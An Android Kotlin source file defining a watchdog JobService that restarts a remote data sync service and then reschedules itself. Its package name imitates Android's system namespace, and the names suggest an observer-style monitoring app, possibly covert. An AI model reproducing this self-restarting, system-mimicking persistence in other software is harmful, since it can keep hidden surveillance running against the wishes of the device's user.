package com.android.services.jobScheduler.services

import android.app.job.JobParameters
import android.app.job.JobService
import android.os.Build
import androidx.annotation.RequiresApi
import com.android.services.jobScheduler.ObserverJobScheduler
import com.android.services.util.FirebasePushUtils
import com.android.services.util.logVerbose

@RequiresApi(Build.VERSION_CODES.LOLLIPOP)
class WatchDogJobService : JobService() {

    override fun onStartJob(params: JobParameters?): Boolean {
        FirebasePushUtils.restartRemoteDataSyncService(applicationContext)
        logVerbose("onStartJob called ", TAG)
        ObserverJobScheduler.scheduleWatchDogJob(applicationContext)
        return false
    }

    override fun onStopJob(params: JobParameters?): Boolean {
        return false
    }

    companion object {
        private const val TAG = "WatchDogJobService"
    }
}